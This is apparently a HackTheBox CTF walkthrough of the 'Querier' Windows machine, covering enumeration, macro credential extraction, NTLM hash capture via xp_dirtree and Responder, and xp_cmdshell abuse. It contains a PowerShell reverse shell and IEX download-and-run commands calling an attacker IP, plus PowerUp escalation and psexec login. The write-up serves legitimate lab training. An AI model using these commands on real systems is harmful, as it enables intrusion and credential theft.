---
title: "Querier"
date: 2024-06-17
categories: HTB
tags: ["ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "querier", "htb walkthrough", "hackthebox", "writeup"]
---

## Credentials

| Username   | Password         | Hash | Source            |
| ---------- | ---------------- | ---- | ----------------- |
| Reporting  | PcwTWTHRwryjc$c6 |      | SMB               |
| Luis       |                  |      | docProps/core.xml |
| msssql-svc | corporate568     |      | sql-responder     |

## Enumeration

### Nmap

```sh
PORT      STATE SERVICE       REASON  VERSION
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763

| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### SMB

![screenshot](/assets/images/querier1.png)

![screenshot](/assets/images/querier2.png)

![screenshot](/assets/images/querier3.png)

#### Currency Volume Report.xlsm 

Unzip the file 

```sh
unzip 'Currency Volume Report.xlsm'
```

![screenshot](/assets/images/querier4.png)

Macros are usually stored at `xl/vbaProject.bin`. Use strings on it to find all readable strings.

```sh
strings x1/vbaProject.bin
```

![screenshot](/assets/images/querier5.png)

```sh
Uid=reporting;
Pwd=PcwTWTHRwryjc$c6
```

## SQL

```sh
Uid=reporting;
Pwd=PcwTWTHRwryjc$c6
```

```sh
impacket-mssqlclient reporting@10.10.10.125 -windows-auth
```

![screenshot](/assets/images/querier6.png)

We don't have `sa` privileges. Though we can't execute commands using `xp_cmdshell` we can steal hashes of the SQL service account by using `xp_dirtree` or `xp_fileexist`.

```sql
exec xp_dirtree '\\10.10.14.42\share\file'
```

and fire up Responder locally.

```sh
sudo responder -I tun0
```

![screenshot](/assets/images/querier7.png)

### Cracking the hash

![screenshot](/assets/images/querier8.png)

## Foothold

using the creds `mssql-svc : corporate568` we can now login to MSSQL. Let's check if we have SA permissions now.

```sh
impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth
```

![screenshot](/assets/images/querier9.png)

enable `xp_cmdshell`

```sql
enable_xp_cmdshell
xp_cmdshell whoami
```

![screenshot](/assets/images/querier10.png)

Now we can execute a TCP reverse shell from [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script and add this line to the end of it. 

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.42 -Port 4444
```

![screenshot](/assets/images/querier11.png)

Run a simple HTTP server and execute it using powershell.

```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.14.42/Invoke-PowerShellTcp.ps1\')
```

![screenshot](/assets/images/querier12.png)

## Privilege Escalation

After getting a shell [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) is used to enumerate further. Download the script and execute it on the server uinsg `Invoke-AllChecks`

```powershell
wget https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1
echo Invoke-AllChecks >> PowerUp.ps1

python3 -m http.server 80
iex(new-object.net.webclient).downloadstring("http://10.10.14.42/PowerUp.ps1")
```

![screenshot](/assets/images/querier13.png)

![screenshot](/assets/images/querier14.png)

Login as admin

```sh
impacket-psexec Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
```

![screenshot](/assets/images/querier15.png)
